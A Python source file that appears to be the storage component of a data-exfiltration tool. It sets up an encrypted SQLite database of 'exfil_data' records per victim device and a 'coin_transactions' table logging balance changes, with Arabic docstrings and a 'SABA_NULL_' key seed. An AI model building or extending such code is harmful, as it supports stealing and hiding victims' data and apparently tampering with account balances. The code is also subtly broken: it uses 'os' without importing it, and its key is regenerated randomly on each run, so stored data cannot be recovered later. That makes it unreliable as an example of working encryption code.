#!/usr/bin/env python3
# Encrypted Storage System

import sqlite3
import json
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import hashlib

class EncryptedStorage:
    def __init__(self, db_file='data/exfil.db'):
        self.db_file = db_file
        self.key = self.generate_key()
        self.init_database()
        
    def generate_key(self):
        """توليد مفتاح تشفير"""
        seed = 'SABA_NULL_' + str(hash(os.urandom(32)))
        return hashlib.sha256(seed.encode()).digest()
        
    def init_database(self):
        """تهيئة قاعدة البيانات المشفرة"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exfil_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                data_type TEXT,
                encrypted_data TEXT,
                device_id TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS coin_transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_id TEXT,
                old_balance INTEGER,
                new_balance INTEGER,
                method TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def store_encrypted(self, data_type, data, device_id='unknown'):
        """تخزين بيانات مشفرة"""
        cipher = AES.new(self.key, AES.MODE_GCM)
        
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode()
            
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        encrypted_record = {
            'nonce': base64.b64encode(cipher.nonce).decode(),
            'tag': base64.b64encode(tag).decode(),
            'data': base64.b64encode(ciphertext).decode()
        }
        
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO exfil_data (data_type, encrypted_data, device_id)
            VALUES (?, ?, ?)
        ''', (data_type, json.dumps(encrypted_record), device_id))
        
        conn.commit()
        conn.close()
        
        return cursor.lastrowid
